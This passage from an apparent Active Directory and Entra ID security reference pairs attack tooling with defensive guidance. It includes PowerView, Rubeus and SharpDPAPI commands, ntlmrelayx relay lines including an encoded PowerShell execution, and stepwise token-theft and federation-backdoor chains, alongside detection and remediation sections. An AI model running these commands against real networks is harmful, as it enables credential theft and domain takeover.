Find-InterestingDomainAcl -ResolveGUIDs

# User hunting
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"  # Where is DA logged in?
Invoke-UserHunter -Stealth -CheckAccess     # Hunt, confirm local admin on hit

# Modify ACLs for abuse
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

### Rubeus — Full Command Reference

| Command | Purpose |
|---------|---------|
| `asktgt` | Request TGT with password/hash/cert |
| `asktgs` | Request TGS for specified SPN |
| `kerberoast` | TGS-REQ service ticket extraction for offline cracking |
| `asreproast` | AS-REP extraction for accounts without pre-auth |
| `ptt` | Pass-the-Ticket: inject ticket into current or target LUID |
| `dump` | Export all tickets (base64 kirbi format) |
| `triage` | List all tickets across all accessible LUIDs |
| `tgtdeleg` | Extract usable TGT without elevation via GSS-API |
| `monitor` | Continuously watch for new TGTs (for unconstrained delegation) |
| `harvest` | Monitor + auto-renew harvested TGTs |
| `s4u` | S4U2self + S4U2proxy for constrained/RBCD delegation abuse |
| `golden` | Forge Golden Ticket (requires krbtgt key) |
| `silver` | Forge Silver Ticket (requires service account key) |
| `diamond` | Modify legitimate TGT to create Diamond Ticket |
| `tgssub` | Modify SPN in a TGS (service name spoofing) |
| `createnetonly` | Spawn process with sacrificial credentials (LUID isolation) |
| `brute` | Kerberos password bruteforce |
| `preauthscan` | Scan for accounts without pre-auth requirement |

**Key flags**: `/opsec` (mimic legitimate Windows client); `/aes` (AES ticket); `/usetgtdeleg` (force RC4 via TGT delegation); `/nowrap`; `/ptt`; `/bronzebit` (CVE-2020-17049 Bronze Bit); `/impersonateuser`; `/msdsspn`.

### GhostPack Suite Reference

**Seatbelt**: C# host-survey tool.
```
Seatbelt.exe -group=system    # OS/AV/LAPS/Defender/Sysmon/UAC/NTLM config/token privileges
Seatbelt.exe -group=user      # Saved creds/DPAPI/certs/browser history/cloud artifacts
Seatbelt.exe -group=all full  # Everything, no filtering
Seatbelt.exe TokenPrivileges DpapiMasterKeys  # Specific checks
Seatbelt.exe -ComputerName=server01 OSInfo    # Remote
```

**SharpDPAPI**: DPAPI credential decryption.
```
SharpDPAPI.exe backupkey /server:DC.domain.local /file:key.pvk   # Domain backup key (DA required)
SharpDPAPI.exe credentials /pvk:key.pvk                          # Decrypt all user cred files
SharpChrome.exe logins /browser:chrome /pvk:key.pvk              # Chrome saved passwords
SharpDPAPI.exe rdg /pvk:key.pvk                                  # RDP saved credentials
```

**SharpUp**: Local privilege escalation enumeration (C# PowerUp port).
```
SharpUp.exe audit    # All checks: unquoted service paths, modifiable binaries/registries,
                     # AlwaysInstallElevated, token privs, DLL hijack in PATH, GPP passwords
```

**SharpWMI**: WMI lateral movement.
```
SharpWMI.exe action=exec computername=server01 command="cmd.exe /c whoami > C:\out.txt"
```

---

## VIII. NTLM Relay Attacks

### NTLM Protocol

**Three-message exchange**: (1) NEGOTIATE (client → server: capabilities, NTLM version); (2) CHALLENGE (server → client: 8-byte random challenge); (3) AUTHENTICATE (client → server: NTLM response = function of challenge + NT hash + client challenge).

**NT hash**: MD4(UTF-16LE(password)). The fundamental AD credential.

**NTLMv1**: DES of challenge using NT hash as key. No salting — same password+challenge → same response. Rainbow table vulnerable; no MIC or EPA support.

**NTLMv2**: HMAC-MD5 of challenge using NT hash + client challenge + timestamp. Salted — defends rainbow tables but NOT relay. LmCompatibilityLevel ≥ 3 forces NTLMv2 only.

**Relay mechanic**: Attacker sits between victim and target service; forwards all three messages. Target establishes authenticated session on behalf of victim. No cracking required.

### Coercion Techniques

| Technique | Protocol | Auth Required | Tool / Notes |
|-----------|----------|---------------|--------------|
| PrinterBug / SpoolSample | MS-RPRN (Print Spooler) | Authenticated Users | SpoolSample.exe; the original (2018, Lee Christensen) |
| PetitPotam | MS-EFSRPC | Originally unauthenticated; CVE-2021-36942 patch added auth requirement; CVE-2022-26925 re-opened partial unauth via different RPC opcode | PetitPotam.py (topotam) |
| DFSCoerce | MS-DFSNM | Authenticated Users | dfscoerce.py (filip-dragovic) |
| ShadowCoerce | MS-FSRVP (Shadow Copy) | Authenticated Users | ShadowCoerce.py |
| WSPCoerce | MS-WSP (Windows Search Protocol) | Authenticated Users | Less commonly mitigated |
| Coercer | Multiple (RPRN, EFSR, DFSNM, FSRVP, EVEN, …) | Varies | Coercer.py (p0dalirius) — automated multi-protocol coercion |

**Patching pattern**: Microsoft has consistently patched coercion primitives **at the RPC interface level** (requiring authentication, enforcing EPA) rather than removing the underlying coerce capability. New protocols are continuously surfaced. Unit 42 reports the technique class remains an active research surface through 2025 — defensive posture must assume future coercion primitives will be discovered. Sources: <https://unit42.paloaltonetworks.com/authentication-coercion/>; <https://horizon3.ai/attack-research/n0-attack-paths/the-elephant-in-the-room-ntlm-coercion-and-understanding-its-impact/>

**Windows 11 / Server 2025 NTLM deprecation**: Microsoft announced NTLM deprecation October 2023; Windows 11 24H2 and Server 2025 introduce enhanced NTLM audit logging and provide policy levers to block NTLM outbound at the OS level. The transition is multi-year; legacy app dependencies make full disablement rare in 2025–2026. SMB signing is **required by default** for outbound connections on Server 2025, and for inbound and outbound connections on Windows 11 24H2 Enterprise/Pro/Education; Server 2025 does not require inbound signing by default.

### SMB Relay

**Conditions**: Target host does not require SMB signing (default on non-DC Windows Server, including Server 2025, which requires signing only for outbound connections; Windows 11 24H2 Enterprise/Pro/Education require inbound signing).

```bash
ntlmrelayx.py -t smb://TARGET_IP -smb2support             # Relay + dump SAM
ntlmrelayx.py -tf targets.txt -smb2support                # Multiple targets
ntlmrelayx.py -t smb://TARGET -smb2support -i             # Interactive shell
ntlmrelayx.py -t smb://TARGET -smb2support -c "powershell -enc ..."
```

### LDAP Relay

**Conditions**: DC does not enforce LDAP signing OR LDAP channel binding. Both must be enforced to fully block LDAP relay.

```bash
ntlmrelayx.py -t ldap://DC_IP --add-computer ATTACKER_PC        # Create machine account for RBCD
ntlmrelayx.py -t ldap://DC_IP --delegate-access --escalate-user victim_computer$   # RBCD setup
ntlmrelayx.py -t ldap://DC_IP --escalate-user lowpriv_user      # DCSync rights
```

**WebDAV + LDAP relay**: WebClient service (default on workstations) allows HTTP auth. Attacker registers a dot-less DNS record (Authenticated Users can create AD-Integrated DNS records by default), coerces auth via UNC path → WebDAV over HTTP → relay to LDAP.

---

## IX. Modern Identity Attack Surface (Entra ID / Azure AD)

### Azure Attack Roles

| Role | Capability |
|------|------------|
| Global Administrator | Full tenant control |
| Privileged Role Administrator | Can assign all roles |
| Application Administrator | Add credentials to service principals |
| Privileged Authentication Administrator | Reset any user's MFA/password |
| Authentication Administrator | Reset non-admin MFA/passwords |

### Key Attack Paths

**MSOL_ account**: Created during Azure AD Connect installation with DCSync rights (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`). Password machine-generated but stored in local SQL config. Extract with AADInternals: `Get-AADIntSyncCredentials`.

**PTA agent compromise**: Pass-Through Authentication agents validate on-prem AD credentials for Entra ID. Agent certificate exportable from the PTA server → install malicious agent → any Entra ID password accepted. Stolen PTA agent certificate cannot be explicitly revoked; removed after 10 days inactivity only.

**Service principal / app credential abuse**: `Application Administrator` or owner rights → add client secrets or certificates to high-privilege service principals → authenticate as SP. MS Graph app role `RoleManagement.ReadWrite.Directory` → assign Global Admin to any SP.

**Managed Identity abuse**: Extract JWT from Azure Instance Metadata Service (`http://169.254.169.254/metadata/identity/oauth2/token`) from compromised VMs.

### Pass-the-PRT (Primary Refresh Token)

PRT is a long-lived token (90 days) issued to Entra ID-joined or Hybrid-joined devices. Used for SSO. TPM-backed on modern hardware.

```
# Extract PRT
RoadToken / ROADtools / AADInternals Export-AADIntLocalDeviceCertificate  (requires local admin)

# Inject PRT cookie into browser session → SSO to any Entra ID app
```

**Device Code Phishing (Storm-2372, 2024–2025)**:
1. Attacker initiates device code auth flow, sends victim the device code URL
2. Victim authenticates with MFA at `microsoft.com/devicelogin`
3. Attacker polls, receives access + refresh tokens WITH MFA claim
4. Registers Entra-joined device using refresh token
5. Requests PRT → satisfies Conditional Access policies requiring compliant devices and MFA

### AzureHound and Hybrid Paths

AzureHound collects Azure/Entra ID data; BloodHound 5.13+ generates cross-tier hybrid paths. On-prem DA → sync account compromise → Entra Global Admin; and vice versa. BloodHound Enterprise also covers Okta (SAML/OIDC federation paths), GitHub (org membership, Actions secrets), and macOS (announced March 2026).

**BloodHound CE v8 + OpenGraph** (released Jul 29 2025): OpenGraph generalizes the graph to ingest identity data from arbitrary platforms via a documented JSON schema. Initial native collectors: AD (SharpHound), Entra ID (AzureHound), GitHub, Snowflake, 1Password, Microsoft SQL Server. Adds **four new trust edges** replacing the legacy `TrustedBy` model to more accurately reflect trust direction, configuration, and exploitability. The November 2025 SpecterOps "Many Subgraphs" post (JD Crandell) demonstrates hybrid attack-path modeling across SharpHound + AzureHound + GCP-Hound + GitHound. Sources: <https://specterops.io/blog/2025/07/29/bloodhound-community-edition-v8-launches-with-opengraph-identity-attack-paths-beyond-active-directory-entra-id/>; <https://specterops.io/blog/2025/11/13/taming-the-attack-graph-a-many-subgraphs-approach-to-attack-path-analysis/>

### CVE-2025-55241 — "Actor Token" Cross-Tenant Impersonation (Dirk-jan Mollema, Sep 2025)

The single most severe Entra ID disclosure of 2025. Mollema discovered that undocumented Azure "Actor tokens" — a legacy service-to-service auth mechanism issued by the legacy Access Control Service — could be requested in a benign attacker tenant and then **replayed against the legacy Azure AD Graph API in any other tenant**, because the Graph API failed to validate that the token's tenant ID matched the resource tenant. Two combined flaws:

1. Impersonation tokens built from (signed) Actor tokens are unsigned JWTs (`alg: none`) that identify the target user by `netId`.
2. Azure AD Graph API accepts them without cross-tenant validation.

An attacker holding such a token could **impersonate any user (including Global Administrators) in any tenant**, read/modify directory data, create service principals, change role assignments, take control of applications and policies — with **no logs generated** for token requests or reads in the victim tenant (Azure AD Graph has no API-level logging); modifications usually still generate audit logs.

Timeline: reported Jul 14 2025; Microsoft fix deployed Jul 17 2025; CVE issued Sep 4 2025; full disclosure Sep 17 2025 (after Black Hat USA 2025 / DEF CON 33). CVSS 10.0 (initially scored 9.0). Sources: <https://dirkjanm.io/>; <https://practical365.com/death-by-token-understanding-cve-2025-55241/>

### Storm-2372 — Device Code Phishing Campaign (2024–2025)

Russian-aligned activity cluster (moderate confidence; Microsoft Threat Intelligence). Active since **August 2024**, expanded scope through 2025. Targets: government, NGO, IT services, defense, telecom, health, higher education, energy/oil-and-gas in Europe, North America, Africa, the Middle East.

**Initial-access chain** (Microsoft, Feb 13 2025):
1. Social-engineering rapport via WhatsApp/Signal/Teams impersonating a relevant figure (academic, journalist, government official).
2. Phishing email with a fake meeting/event invite containing a Microsoft device-code URL (`microsoft.com/devicelogin`) and code.
3. Victim authenticates with MFA at the legitimate Microsoft endpoint.
4. Attacker, polling the `/token` endpoint, receives access + refresh tokens carrying MFA claims.

**Feb 14 2025 escalation**: within 24 hours of Microsoft's first publication, Storm-2372 pivoted to using the **Microsoft Authentication Broker** client ID in device-code flows. This client ID is permitted to register devices in Entra ID via the refresh token. Chain:
1. Refresh-token replay against MS Authentication Broker → device-registration scope.
2. Register an attacker-controlled device in the victim tenant.
4. Request a Primary Refresh Token (PRT) → access organizational resources, including email.
5. Graph API enumeration: search emails for `password`, `admin`, `credentials`, `ministry`, `gov`; exfiltrate.

Source: <https://www.microsoft.com/en-us/security/blog/2025/02/13/storm-2372-conducts-device-code-phishing-campaign/>

### Storm-0501 — Hybrid Cloud Ransomware (2024–2025)

Financially-motivated RaaS affiliate active since 2021 (Sabbath, Hive, BlackCat, LockBit, Embargo); pivoted to **hybrid-cloud attack chain** in 2024 (Microsoft, Sep 26 2024). Canonical "on-prem AD → Entra Connect sync account → cloud Global Admin → federated-domain backdoor" path.

**Pivot mechanism** (Entra Connect / formerly Azure AD Connect):
1. On-prem compromise via Impacket + DPAPI-key theft + security-product disablement.
2. Locate the Entra Connect server (often dedicated, lightly defended).
3. Extract plaintext credentials for both the on-prem and cloud sync accounts from the Entra Connect SQL store.
4. Authenticate to Microsoft Graph with the cloud Directory Synchronization Account → **set or change Entra ID passwords for any hybrid-synced account, bypassing password sync**.
5. Reset a Global Admin (or sync-promotion target), assume that identity.

**Cloud persistence — federated-domain backdoor**:
1. From Global Admin, create a new federated domain under attacker control.
2. Convert a target domain (if managed → federated).
3. Deploy a root certificate for SAML token signing (AADInternals tradecraft).
4. Mint SAML tokens that impersonate any user and bypass MFA.

Backups deleted, ransomware deployed; Aug 27 2025 Microsoft update reports evolution to cloud-based ransomware (exfiltrate Azure Storage data, delete data and backups, encrypt remaining data with attacker-created Key Vault keys). Sources: <https://www.microsoft.com/en-us/security/blog/2024/09/26/storm-0501-ransomware-attacks-expanding-to-hybrid-cloud-environments/>; <https://www.microsoft.com/en-us/security/blog/2025/08/27/storm-0501s-evolving-techniques-lead-to-cloud-based-ransomware/>

### Midnight Blizzard (APT29 / NOBELIUM) — Microsoft Corporate Tenant Breach (Jan 2024)

Russian state actor; Microsoft self-disclosure Jan 25 2024 with March 8 2024 update. Initial access via **password spray against a legacy non-production test tenant with no MFA**, identified Jan 12 2024.

Chain: password spray → test-tenant access → take over a legacy test OAuth application with elevated access to the corporate environment → create malicious OAuth apps and grant them the Exchange Online `full_access_as_app` role → enumerate and exfiltrate from corporate mailboxes (including senior leadership and security teams) → pivot to source-code repositories and internal systems via information mined from email. Microsoft observed a **10× volume increase** in password sprays in February relative to January. Microsoft's response: apply current security standards (MFA, blocked legacy auth) to all legacy systems, even at the cost of disruption.

Lesson surface: legacy non-production tenants are first-party Tier-Zero blast-radius even when they look like dev sandboxes; OAuth consent grants on Microsoft-internal apps from a low-privilege foothold can escalate to mailbox-graph access at corporate scope. Sources: <https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/>; <https://msrc.microsoft.com/blog/2024/03/update-on-microsoft-actions-following-attack-by-nation-state-actor-midnight-blizzard/>

### Conditional Access Bypass — Token-Theft Era (2024–2026)

Conditional Access (CA) is the policy engine enforcing MFA / compliant-device / network-location constraints on Entra ID logins. The 2024–2026 research arc has been the systematic erosion of CA's reliability when paired with token theft:

- **Token-theft as the dominant MFA bypass**: 2024 IR data shows MFA bypass via stolen/replayed access + refresh tokens overtook traditional credential-only attacks. CA evaluates on token issuance; once an attacker holds a valid token, CA is bypassed for that token's lifetime. Refresh-token replay extends that window indefinitely.
- **Microsoft Authentication Broker device-registration trick** (Storm-2372, above): registers attacker device in tenant → requests a PRT with the new device identity.
- **Intune compliance-gate bypass** (Dirk-jan Mollema; Yuya Chudo, Black Hat Europe 2024): Microsoft maintains backend exclusions for certain resources (the Intune enrollment service; tokens from the excluded client ID worked against Microsoft Graph and AD Graph) from the "Require device to be marked as compliant" grant control. Attackers register a device that never satisfies CA but transparently authenticates to the excluded endpoints.
- **Token Protection** (CA control): binds tokens to the issuing device via a cryptographic device key. Mitigates token replay for in-scope resources (initially limited subset — SharePoint, Exchange Online client apps). Coverage continues to expand through 2026.

### Hybrid Identity Attack Surface

The single highest-leverage attack surface in modern AD/Entra environments — every primitive that crosses the on-prem ↔ cloud boundary is a candidate for full-environment compromise.

**Entra Connect (formerly Azure AD Connect) — sync account compromise**:
- The on-prem `MSOL_<hash>` account is created with DCSync rights (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`) and an attacker-recoverable password stored in the local SQL config on the Entra Connect server.
- Extraction: `Get-AADIntSyncCredentials` (AADInternals); decrypt via DPAPI-MK on the Entra Connect host.
- Outcome: DCSync on-prem AD AND password-reset for any hybrid-synced cloud account via the cloud sync account (the Storm-0501 chain).

**AD FS — federated identity attacks**:
- AD FS Token-Signing Certificate theft → forge SAML tokens for any Entra ID user (Golden SAML, Solorigate/SUNBURST tradecraft). AADInternals: `Export-AADIntADFSCertificates`; `New-AADIntSAMLToken`.
- Federated-domain takeover: from Entra Global Admin, register a new federated domain under attacker control or convert an existing managed domain to federated. Storm-0501's cloud persistence primitive.
- Replicated to other federation providers (PingFederate, Shibboleth, ADFS proxy) — every IdP holding a signing key is Tier-Zero by definition.

**Pass-Through Authentication (PTA) agent compromise**:
- PTA agents (`AzureADConnectAuthenticationAgentService`) validate on-prem AD credentials against cloud-initiated logins via outbound HTTPS to Microsoft.
- Stolen agent certificate (from `%programdata%\Microsoft\Azure AD Connect Authentication Agent\Config`) → install rogue PTA agent → cloud login of any synced user with **any password** succeeds (rogue agent returns "valid" for any credential).
- Stolen PTA agent certificates **cannot be explicitly revoked**; only removed after 10 days of inactivity in the tenant.

**Primary Refresh Token (PRT) — token-exchange surface**:
- PRT issued to Entra-joined / Hybrid-joined devices at sign-in; 90-day default lifetime; TPM-bound on capable hardware.
- Extraction (local admin required pre-TPM-binding): `roadtx`, `AADInternals Export-AADIntLocalDeviceCertificate`, `ROADtoken`.
- PRT cookie injection into browser session → SSO to any Entra ID app without prompting. PRT-phishing (Mollema 2023) achieves the same outcome remotely: a phished refresh token for the Microsoft Authentication Broker client ID (device code or evilginx) is used to register a device and request a PRT.
- WHfB key abuse: once the device key + WHfB key are in attacker hands, can mint PRTs offline without further interaction.

**Cross-link**: For SAML/OIDC federation deep details (assertion forgery, audience confusion, encrypted-assertion downgrade), see `saml_federation_expertise.md`. For Entra cloud-IAM specifics (Conditional Access policy authoring, Managed Identity scoping, Microsoft Graph permission boundary), see `cloud_iam_expertise.md`.

### Identity Threat Detection and Response (ITDR) — Category Emergence

**Gartner positioning**: ITDR named a top security & risk management trend in 2022. Gartner definition: "a security discipline that encompasses threat intelligence, best practices, a knowledge base, tools and processes to protect identity systems… implementing detection mechanisms, investigating suspect activities, and responding to attacks." MarketsandMarkets projection: $12.8B (2024) → $35.6B (2029).

**Category occupants** (2024–2026):
- **Microsoft Defender XDR / Defender for Identity (MDI)**: MDI sensors on DCs/AD FS/Entra Connect surface AD-side attacks (Kerberoasting, DCSync, golden ticket, NTLM relay); Entra ID Protection covers cloud-side (impossible travel, leaked credentials, anomalous token use); Defender XDR correlates the two. See §X detection table for AD-side coverage.
- **CrowdStrike Falcon Identity Protection** (formerly Preempt): inline policy enforcement at the AD authentication path; ITDR-category leader; on-prem-heavy.
- **SpecterOps BloodHound Enterprise**: the only pure-exposure (vs. detection) ITDR vendor — surfaces attack paths *before* exploitation, not signatures *after*. Tier-Zero choke-point analysis is the ITDR-category's preventive arm.
- **Semperis Directory Services Protector**, **Netwrix ITDR**, **Silverfort**: AD-centric posture/detection vendors with varying ITDR depth.

**Cross-link**: For detection-engineering methodology (signature design, log-source mapping, SIEM correlation patterns), see `detection_engineering_expertise.md`. For incident-response procedures specific to identity compromise (PRT/refresh-token revocation, federated-domain remediation, krbtgt rotation), see `dfir_methodology_expertise.md`.

### Tier-Zero Evolution and Modernized PAW Guidance

Microsoft's tiered-administration model has evolved past the legacy "red forest" (Enhanced Security Admin Environment, ESAE) deployment guidance, which was officially retired in 2020–2021. Current guidance (Microsoft Learn, 2024–2026):

- **Enterprise Access Model (EAM)** replaces the three-tier model with **Control Plane / Management Plane / Data Plane / Application Plane / User Access Plane** — explicitly encompassing cloud identity (Entra ID), cloud workloads, and SaaS in the same model as on-prem AD.
- **Tier-Zero asset list expanded** to include: Entra Global Admin and equivalent roles, Entra Connect / AD FS / PTA agent servers, federation IdPs, Microsoft Graph applications with directory-write app roles, AD CS infrastructure (including CA private keys and PKI ACL-holders), backup/monitoring systems with DC-level access, and any device that authenticates with hybrid-joined or Entra-joined status to Tier-Zero resources.
- **Cloud PAW patterns**: Azure Virtual Desktop and Windows 365 Cloud PCs configured as Privileged Access Workstations — application allowlisting, Conditional Access enforcement of compliant-device + phishing-resistant-MFA + Token Protection grant controls, restricted egress. Recommended OS: Windows 11 Enterprise (for Credential Guard, HVCI, hypervisor-protected code integrity, and Application Control / WDAC support).
- **Token Protection in Conditional Access** as a Tier-Zero-mandatory grant control: prevents stolen tokens from administrator sessions being replayed off-device.

---

## X. Defensive Countermeasures

### Tiered Administration Model

**Microsoft Enterprise Access Model (EAM)** — three planes:
- **Control Plane (Tier 0)**: Domain Controllers, AD, PKI, Azure AD Connect, Federation servers, backup/monitoring systems with DC-level access. Requires PAWs (Privileged Access Workstations) dedicated to Tier 0 work only.
- **Management Plane (Tier 1)**: Servers, applications
- **User Access Plane (Tier 2)**: Workstations, end-user devices

No Tier 0 credentials should ever authenticate to Tier 1/2 systems. No Tier 1/2 sessions should be present on Tier 0 systems. BloodHound `HasSession` edges are the most common source of Tier boundary crossings.

### Protected Users Security Group

Available since Windows Server 2012 R2. Members automatically receive:
- No NTLM authentication (Kerberos only)
- No DES/RC4 Kerberos (AES128/AES256 only)
- No unconstrained delegation (flag ignored)
- TGT lifetime: 4 hours (non-renewable)
- Credentials not cached on device

**Caveats**: Do not add service accounts or computer accounts; services requiring NTLM, DES/RC4, or long TGT lifetimes will break.

### Windows Defender Credential Guard

Virtualization-Based Security (VBS) isolates LSA secrets into `LSAIso.exe` (VTL1). LSASS (VTL0) communicates with LSAIso via RPC but never directly handles secrets.

**What it protects**: NTLM hashes in LSASS; Kerberos TGTs; Kerberos AES keys.

**What it does NOT protect**: NTLM hashes supplied interactively at prompts; SAM database (local account hashes); AD database on DCs; Kerberos TGS (service tickets); NTLM relay attacks (challenge-response still flows from LSASS). Default on Windows 11 22H2+ (eligible hardware).

### Microsoft Defender for Identity (MDI) Detection Reference

| Attack | MDI Detection | External ID |
|--------|---------------|-------------|
| Golden Ticket — time anomaly | TGT with timestamps inconsistent with account activity | 2022 |
| Golden Ticket — nonexistent account | TGT issued for account not in AD | 2027 |
| Golden Ticket — encryption downgrade | RC4 TGT from AES-capable account | 2009 |
| DCSync | Non-DC performing replication (events 4662 + 4929) | 2006 |
| Kerberoasting | LDAP SPN query (event 1644) + TGS-REQ (event 4769) with RC4 | 2410 |
| AS-REP Roasting | Multiple AS-REQ without pre-auth for different accounts | 2412 |

**Detection gaps**: Diamond and Sapphire tickets (base ticket legitimately issued); NTLM relay (coverage varies); uncorrelated Kerberoasting TGS requests may evade.

### Attack Path Remediation Priority (BloodHound-driven)

1. **Remove `AdminTo` edges**: Audit local admin via GPO; enforce LAPS; tiered admin discipline — only Tier-appropriate admins have local admin on that tier's systems
2. **Eliminate `HasSession` crossings**: Stop privileged users from logging into unprivileged workstations; use jump servers/PAWs for all privileged access
3. **Clean `WriteDacl`/`GenericAll` ACLs**: `Find-InterestingDomainAcl`; compare against intended RBAC; remove excessive delegations
4. **Protect DCSync rights**: Remove from all but DCs; audit MSOL_ account credentials on Azure AD Connect servers
5. **RBCD cleanup**: Audit `msDS-AllowedToActOnBehalfOfOtherIdentity`; remove unexpected values
6. **Shadow Credentials cleanup**: `Whisker.exe list` on sensitive accounts; audit `msDS-KeyCredentialLink`

### LAPS Reference

**Windows LAPS (April 2023)**: Built into Windows OS — no agent. Stores password in `msLAPS-EncryptedPassword` (AD-joined, when password encryption is enabled by policy; otherwise clear text in `msLAPS-Password`) or Entra ID (Entra-joined, always encrypted). Configurable via Intune or Group Policy. Azure RBAC for retrieval via MS Graph. Legacy LAPS stores `ms-Mcs-AdmPwd` in plaintext in AD — readable by anyone with `ReadLAPSPassword` ACE.

---

## XI. Staff-Level Distinguishing Expertise

1. **BloodHound as a defense tool, not just offense**: The continuous exposure scoring model in BloodHound Enterprise changes the defense calculus — instead of "patch the CVE," defense becomes "eliminate the choke point node." The choke point concept (which nodes, if removed, eliminate the most attack paths) gives security teams a ranked remediation queue aligned with actual attacker behavior.

2. **AD CS as the most underestimated attack surface**: The "Certified Pre-Owned" research revealed that most enterprises had AD CS deployed for 10+ years with no security review, multiple ESC1-vulnerable templates, and often ESC6 or ESC8 active. The 2021 disclosure shifted the standard pentest scope — AD CS enumeration is now mandatory.

3. **Forest trust = credential boundary, not security boundary**: Most enterprises treat the forest trust as a hard security boundary. The Schroeder/Christensen 2018 finding — that Authenticated Users from Forest B can trigger PrinterBug against Forest A DCs — means a bidirectional forest trust is a direct attack path between forests. This is architecturally exploitable, not just a misconfiguration.

4. **Hybrid identity as the highest-risk attack surface in 2024+**: The MSOL_ account (Azure AD Connect sync account with DCSync rights) is created with a machine-generated password that is stored in a local SQL database. In organizations that have deployed Azure AD Connect without reading the security guidance, this account is a direct DA → Global Admin bridge in both directions. MDI and most SIEMs do not alert on MSOL_ account usage unless explicitly configured.

5. **NTLM relay chains grew longer**: ESC8 (NTLM relay to AD CS Web Enrollment) extended the relay chain from "compromise a workstation" to "compromise the entire domain." The combination of any coercion technique + ESC8 + Rubeus PKINIT is now the most reliable path from non-privileged foothold to Domain Admin that doesn't touch LSASS.

6. **Diamond/Sapphire tickets defeat detection**: The standard MDI golden ticket detection looks for anomalous TGT properties. Diamond tickets (legitimate base TGT, modified PAC) and Sapphire tickets (legitimate PAC from S4U2self U2U, forged TGT envelope) defeat these signatures. The only reliable detection is PAC validation on every service ticket — which is expensive but increasingly deployed via `KrbtgtFullPacSignature`.

7. **Token theft has overtaken password compromise as the dominant Entra ID intrusion vector (2024–2026)**: Storm-2372's device-code phishing → Microsoft Authentication Broker → device-registration → PRT chain bypasses every Conditional Access control short of Token Protection. The threat model shift: stop treating MFA as a sufficient control for high-privilege Entra accounts; Token Protection + Authentication Strength (phishing-resistant) + compliant-device + sign-in-frequency must compose. The ESC8/relay class on-prem maps directly to the device-code-phishing class in cloud — both achieve credentialless escalation via legitimate-looking auth artifacts.

8. **The AD CS escalation matrix expanded 100% in 2 years (2022–2024)**: ESC1–ESC8 (2021, "Certified Pre-Owned") became ESC1–ESC16 (Certipy v5 release). Notably ESC13 (issuance policy → group mapping, Knudsen 2024) and ESC15/EKUwu (V1 template Application Policy injection, Bollinger 2024, CVE-2024-49019) are mechanically different from the original eight — neither involves a misconfigured template DACL or a missing CA-side flag. They abuse server-side AD/AD CS semantics that have existed since Windows 2000 but were never previously audited. The lesson: AD CS attack-research is **not** complete; expect ESC17+ in the 2026 window. Every audit must run `certipy find -vulnerable` with a current Certipy version, not an old one.

9. **Hybrid-identity boundary is the defining 2024–2026 attack surface**: Entra Connect / AD FS / PTA / federated-domain primitives are each independent paths from on-prem DA → cloud Global Admin and vice versa. Storm-0501 weaponized the Entra Connect path operationally at ransomware scale; Mollema's 2024–2025 research surface (Federated Credentials persistence, TAP abuse, Intune-AD CS bridge) keeps expanding the catalog. Defense must treat the Entra Connect / AD FS / federation-IdP hosts as Tier-Zero with the same rigor as DCs — same PAW-only access, same monitoring depth, same change-control.

10. **CVE-2025-55241 (Mollema, Sep 2025) is the canonical post-2024 "no-log compromise" case**: an unsigned impersonation token built from an Actor token, replayed cross-tenant against Azure AD Graph API, impersonated any Global Admin in any tenant with no logs for token requests or reads in the victim tenant. The structural lesson: cloud auth artifacts that bypass the standard token-issuance path also bypass the standard audit path — and tenants cannot detect what they cannot log. Defensive corollary: never rely on a single tenant's logs to detect cross-tenant compromise; require Microsoft-side correlation (Microsoft Defender XDR, Sentinel UEBA) for high-assurance detection on cloud-control-plane events.

11. **BloodHound OpenGraph (v8, Jul 2025) makes identity attack-path analysis cross-platform**: every identity surface — GitHub orgs/Actions secrets, Snowflake roles, 1Password vault permissions, SQL Server logins, Jamf MDM — becomes a candidate Tier-Zero node in the same graph as AD and Entra ID. The defensive implication: choke-point analysis must now span the full identity stack; an unprotected GitHub Actions secret with Azure-deploy credentials is on the same shortest-path graph as a Domain Admin's logged-in workstation. Mature ITDR programs in 2026 are running OpenGraph against the full identity surface, not just AD + Entra.
